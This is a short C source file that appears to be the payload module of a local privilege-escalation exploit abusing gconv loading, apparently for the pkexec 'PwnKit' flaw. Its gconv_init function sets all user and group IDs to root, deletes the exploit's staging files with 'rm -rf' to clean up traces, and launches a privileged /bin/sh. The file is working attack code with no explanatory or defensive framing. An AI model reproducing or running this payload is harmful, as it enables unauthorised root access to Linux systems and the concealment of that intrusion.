#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {

}

void gconv_init() {

    char * const args[] = { 
        "/bin/sh",
        "-pi",
        NULL 
    };

    char * const envp[] = { 
        "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin",
        NULL 
    };

    //Setting values for ROOT to get privileged shell
    setuid(0);  //  set UID to 0
    setgid(0);  //  set GID to 0
    seteuid(0); //  set EUID to 0
    setegid(0); //  set EGID to 0

    //Cleaning up
    system("/bin/rm -rf GCONV_PATH=. hacker;");

    //Popping shell
    execve("/bin/sh", args, envp);
	exit(0);
}
